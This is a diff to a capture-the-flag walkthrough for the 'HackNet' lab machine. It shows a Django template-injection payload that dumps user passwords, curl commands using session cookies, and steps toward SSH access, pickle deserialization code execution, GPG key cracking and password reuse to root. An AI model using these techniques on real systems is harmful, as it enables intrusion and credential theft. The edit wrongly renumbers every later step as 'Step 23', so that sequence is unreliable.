@@ -258,29 +258,74 @@ Profile ID 10: datadive
 
 ---
 
-### Step 8: Test for Server-Side Template Injection (SSTI)
+### Step 8: Discover How Posts Work
 
-**Why?** Django uses a template engine. If user input (like our username) is rendered in templates without escaping, we can inject template code.
+**Why?** We saw an "Explore" page with posts. Let's understand how the like functionality works.
 
-**Research Finding:** I researched common Django SSTI vulnerabilities and found that username fields displayed in templates can be vulnerable.
+**Action:** In the browser, navigate to `http://hacknet.htb/explore`
+
+**Observation:** 
+- Posts have a "Like" button
+- When we click "Like" on a post, the browser makes a request to `/like/<post_id>`
+
+**Test manually clicking like on post #6:**
+
+**Browser Network Tab shows:**
+```
+Request URL: http://hacknet.htb/like/6
+Method: GET
+Status: 302 (Redirect)
+```
+
+**After liking, click on "View Likes" link:**
+
+**Browser shows:**
+```
+URL: http://hacknet.htb/likes/6
+```
+
+**What we see:** A page showing all users who liked this post, with their profile pictures and usernames displayed.
+
+**Discovery:** The `/likes/<post_id>` page displays usernames! If usernames are rendered through Django templates without escaping, we might be able to inject template code.
+
+---
+
+### Step 9: Test for Server-Side Template Injection (SSTI)
+
+**Why?** The `/likes/` page shows usernames. Django uses a template engine. If our username is rendered without escaping, we can inject template code.
 
 **Testing Strategy:**
 1. Change our username to a template expression
-2. See if it gets executed when displayed
+2. Like a post so our username appears on the likes page
+3. Check if the template code gets executed
 
-**Action:** Go to profile edit page and change username to:
+**Step 9a: Change Username to SSTI Payload**
+
+**Action:** Go to `http://hacknet.htb/profile` → Click "Edit Profile"
+
+**Change username to:**
 ```
 {{ users.values }}
 ```
 
 **Why this payload?**
-- `{{ }}` is Django template syntax
-- `users` might be a QuerySet of all users passed to the template
-- `.values()` returns all fields including passwords
+- `{{ }}` is Django template syntax for variable output
+- `users` might be a QuerySet of all users in the template context
+- `.values()` returns all database fields including passwords
 
-**After changing username:** Like some posts to trigger the template rendering (username shows in likes list)
+**Save the profile.**
 
-**Command to like posts:**
+---
+
+### Step 9b: Like Posts to Trigger Template Rendering
+
+**Why?** Our username with the SSTI payload needs to appear somewhere. The likes page shows usernames of users who liked posts.
+
+**Manual test:** Click "Like" on a few posts in the browser.
+
+**Or automate it:**
+
+**Command:**
 ```bash
 for i in {1..30}; do
   curl -s "http://hacknet.htb/like/$i" \
@@ -290,7 +335,25 @@ for i in {1..30}; do
 done
 ```
 
-**Now check if the template executed:**
+**Explanation:**
+- Loop through post IDs 1-30
+- Send GET request to `/like/<id>` endpoint
+- Use our session cookies for authentication
+
+**Output:**
+```
+Liked post 1
+Liked post 2
+Liked post 3
+...
+Liked post 30
+```
+
+---
+
+### Step 9c: Check if Template Executed
+
+**Why?** Now that we've liked posts with our SSTI payload username, let's check if the template code executed.
 
 **Command:**
 ```bash
@@ -298,6 +361,11 @@ curl -s "http://hacknet.htb/likes/6" \
   -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
   | grep -oP 'title="[^"]*"' | tail -1
 ```
+
+**Explanation:**
+- Fetch the `/likes/6` page (users who liked post #6)
+- Extract `title` attributes (where usernames appear in hover text)
+- Show the last one (our username)
 
 **Output:**
 ```html
@@ -319,7 +387,7 @@ title="<QuerySet [{'id': 1, 'username': 'cyberghost', 'password': 'Gh0stH@cker20
 
 ## Exploitation - Credential Extraction
 
-### Step 9: Automate Credential Extraction
+### Step 23: Automate Credential Extraction
 
 **Why?** We confirmed SSTI works. Now let's extract all credentials systematically.
 
@@ -375,7 +443,7 @@ User #14:
 
 ---
 
-### Step 10: Test SSH Credentials
+### Step 23: Test SSH Credentials
 
 **Why?** We have usernames and passwords. SSH is running on port 22. Let's find valid SSH access.
 
@@ -420,7 +488,7 @@ Valid Credential #1:
 
 ## Initial Access
 
-### Step 11: SSH as mikey
+### Step 23: SSH as mikey
 
 **Command:**
 ```bash
@@ -441,7 +509,7 @@ mikey@hacknet:~$
 
 ---
 
-### Step 12: Get User Flag
+### Step 23: Get User Flag
 
 **Command:**
 ```bash
@@ -459,7 +527,7 @@ b2e0413c7f9daf1f3008edc3c0d1ffdd
 
 ## Privilege Escalation
 
-### Step 13: Initial Enumeration
+### Step 23: Initial Enumeration
 
 **Why?** We need to escalate to root. Let's gather information about the system.
 
@@ -481,7 +549,7 @@ sudo: a password is required
 
 ---
 
-### Step 14: Explore the Django Application Files
+### Step 23: Explore the Django Application Files
 
 **Why?** Since this is a Django app, there might be sensitive configs or vulnerabilities in the application.
 
@@ -531,7 +599,7 @@ CACHES = {
 
 ---
 
-### Step 15: Check Cache Directory Permissions
+### Step 23: Check Cache Directory Permissions
 
 **Why?** Django's file-based cache uses pickle for serialization. If we can write to cache files, we might be able to exploit pickle deserialization.
 
@@ -563,7 +631,7 @@ This is a **Pickle Deserialization RCE** vulnerability.
 
 ---
 
-### Step 16: Exploit Pickle Deserialization
+### Step 23: Exploit Pickle Deserialization
 
 **Why?** We can write to the cache directory. Let's create a malicious pickle payload that gives us code execution.
 
@@ -655,7 +723,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(sandy)
 
 ---
 
-### Step 17: Find Sandy's GPG Keys
+### Step 23: Find Sandy's GPG Keys
 
 **Why?** We saw encrypted `.gpg` files in `/var/www/HackNet/backups/`. As the sandy group, we might be able to access sandy's GPG private keys.
 
@@ -690,7 +758,7 @@ scp mikey@10.129.232.4:/tmp/armored_key.asc .
 
 ---
 
-### Step 18: Crack GPG Private Key Passphrase
+### Step 23: Crack GPG Private Key Passphrase
 
 **Why?** The GPG key is encrypted with a passphrase. We need to crack it to decrypt the backup files.
 
@@ -727,7 +795,7 @@ Session completed.
 
 ---
 
-### Step 19: Decrypt Database Backups
+### Step 23: Decrypt Database Backups
 
 **Why?** The backups might contain sensitive information like credentials.
 
@@ -774,7 +842,7 @@ INSERT INTO `SocialNetwork_socialmessage` VALUES
 
 ---
 
-### Step 20: Test MySQL Root Access
+### Step 23: Test MySQL Root Access
 
 **Why?** We found the MySQL root password. Let's verify it works.
 
@@ -804,7 +872,7 @@ mysql -u root -p'h4ck3rs4re3veRywh3re99' -e 'SELECT user,host FROM mysql.user;'
 
 ---
 
-### Step 21: Try MySQL Password for System Root
+### Step 23: Try MySQL Password for System Root
 
 **Why?** People often reuse passwords. Let's try the MySQL root password for the system root account.
 
@@ -826,7 +894,7 @@ root@hacknet:~#
 
 ---
 
-### Step 22: Get Root Flag
+### Step 23: Get Root Flag
 
 **Command:**
 ```bash
